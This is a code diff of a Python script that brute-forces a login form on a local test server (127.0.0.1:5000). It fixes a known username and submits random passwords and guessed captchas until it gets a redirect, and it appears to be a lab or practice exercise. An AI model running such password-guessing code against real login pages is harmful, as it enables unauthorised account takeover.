@@ -1,25 +1,21 @@
 import requests
-import itertools
-import string
 import random
-import threading
 
 url = 'http://127.0.0.1:5000/login'
 
-def attempt_login(username, password):
-    attempt = {'username': username, 'password': password}
+def attempt_login(username, password, captcha):
+    attempt = {'username': username, 'password': password, 'captcha': captcha}
     r = requests.post(url, data=attempt)
-    return r.status_code == 200
+    return r
 
 characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
+username = 'safwan' # Assuming the attacker knows the username
 
 def main():
     while True:
         valid = False
         while not valid:
-            generate_username = random.choices(characters, k=random.randint(8, 20))
-            username = "".join(generate_username)
-            generate_password = random.choices(characters, k=random.randint(8, 20))
+            generate_password = random.choices(characters, k=random.randint(4, 20)) #random.randint(4, 20)
             password = "".join(generate_password)
             file = open("tries.txt", 'r')
             tries = file.read()
@@ -29,18 +25,21 @@ def main():
             else:
                 valid = True
 
-        if attempt_login(username, password):
+        #password = '1234'
+        generate_captcha = random.choices(characters, k=4)
+        captcha = "".join(generate_captcha)
+        r = attempt_login(username, password, captcha)
+        if r.status_code == 302:
             print(f"Success! Username: {username}, Password: {password}")
             with open("correct_password.txt", "w") as f:
-                f.write(f"{username} , {password}\n")
+                f.write(f"{password}\n")
                 f.close()
             exit()
         else:
             with open("tries.txt", "a") as f:
-                f.write(f"{username} , {password}\n")
+                f.write(f"{password}\n")
                 f.close()
             print(f"Wrong! Username: {username}, Password: {password}")
 
-
-for x in range(20):
-    threading.Thread(target=main).start()
+if __name__ == '__main__':
+    main()
